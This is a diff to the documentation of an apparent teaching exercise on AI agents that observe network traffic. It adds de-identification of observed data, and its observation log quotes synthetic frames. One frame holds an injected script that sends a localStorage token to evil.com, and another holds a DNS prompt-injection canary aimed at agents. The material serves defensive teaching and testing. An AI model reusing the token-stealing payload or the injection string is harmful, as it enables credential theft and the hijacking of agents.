@@ -7,6 +7,7 @@
 - Distinguish observations from instructions in traffic
 - Build ephemeral buffers with safe deletion
 - Design downstream action guards
+- De-identify what is observed: pseudonymize identities, redact secrets
 
 ## Conceptual Explanation
 
@@ -71,6 +72,27 @@ Key lines, verbatim (the run prints all 8 frames for each agent):
   frame_008 (local 127.0.0.1->127.0.0.1, trusted_local, taint low):
     ALLOWED: store_token [body]
 
+--- Observation log: what each agent writes down ---
+  Baseline (recorded in the clear):
+    http 192.168.1.10:80 {"user": "alice", "contact": "alice@corp.example", "role": "admin", "token"
+    http 192.168.1.10:80 <html><body>Welcome! <script>fetch('http://evil.com/steal?token='+localStor
+    dns 192.168.1.1:53 api.internal.example -> 10.0.0.50,CANARY_DNS_INJECTION_IGNORE_RULES
+    tls 192.168.1.20:443 CN=api.internal.example
+    custom 192.168.1.30:9999 DATA_CHUNK_1
+    http 192.168.1.10:80 {"error": "unauthorized"}
+    http 10.0.0.99:80 {"user": "alice", "contact": "alice@corp.example", "token": "DEMO_TOKEN_FORGED
+    local 127.0.0.1 {"service": "api.internal.example", "token": "DEMO_LOCAL_TOKEN_XYZ789"}
+  Guarded (de-identified before recording):
+    http HOST_0272:80 {"user": "USER_5aff", "contact": "EMAIL_e50e", "role": "admin", "token": "[RED
+    http HOST_0272:80 <html><body>Welcome! <script>fetch('http://evil.com/steal?token=[REDACTED]
+    dns HOST_239e:53 api.internal.example -> HOST_b6d0,CANARY_DNS_INJECTION_IGNORE_RULES
+    tls HOST_ec1a:443 CN=api.internal.example
+    custom HOST_ff75:9999 DATA_CHUNK_1
+    http HOST_0272:80 {"error": "unauthorized"}
+    local HOST_f63c {"service": "api.internal.example", "token": "[REDACTED]"}
+  De-identified before recording: 1 username, 1 email, 8 IPs, 3 secrets; 0 identities or secrets written in the clear
+  (frame_007 is out of scope, so the guarded agent never records it - the baseline logs its user and token anyway)
+
 --- Provenance rule: a laundered taint label still cannot store an intercepted token ---
   frame_001_relabelled_low (http 192.168.1.10:80->192.168.1.100:54321, intercepted_network, taint low):
     BLOCKED: store_token (intercepted_network_cannot_drive_privileged_action) [body]
@@ -79,6 +101,8 @@ Key lines, verbatim (the run prints all 8 frames for each agent):
 After delete: None  (buffer's own 22-byte copy is now b'\x00\x00\x00\x00\x00\x00'...)
 Agent buffer after the run: 0 live entries (stored=27, zeroed=27, expired=0, evicted=0)
 ```
+
+The **observation log** is the one thing the guarded agent is allowed to keep, and it is de-identified before it is written down. Between scope and taint (`scope → observe/de-identify → taint → guard`), each per-frame note runs through `shared/anonymize.py` (`Anonymizer.deidentify`): source IPs and usernames become stable pseudonyms (`HOST_0272`, `USER_5aff`), the synthetic `contact` e-mail (added to frame_001 and frame_007) becomes `EMAIL_e50e`, and tokens/passwords are redacted to `[REDACTED]`. Pseudonyms are stable across frames — so records still join — and locally reversible via `agent.anon.reverse(tag)`. The baseline records the same notes in the clear; frame_007 is out of scope, so the guarded agent never records it while the baseline logs its user and forged token anyway.
 
 ## Traffic Frames
 
@@ -141,7 +165,7 @@ guard.authorize("store_credential",   TaintLevel.LOW,  body, Provenance.TRUSTED_
 | `fixtures/traffic.json` | 8 synthetic traffic frames, scope policy with per-action ceilings, buffer config, `expected` answer key |
 | `student/interceptbound.py` | Detector, tracker, buffer, guard, agents |
 | `student/generate_intercept_results.py` | Results generator — compares both agents' verdicts with the fixture's `expected` block, exits 1 on mismatch |
-| `tests/test_interceptbound.py` | 39 tests |
+| `tests/test_interceptbound.py` | 44 tests |
 
 ---
 
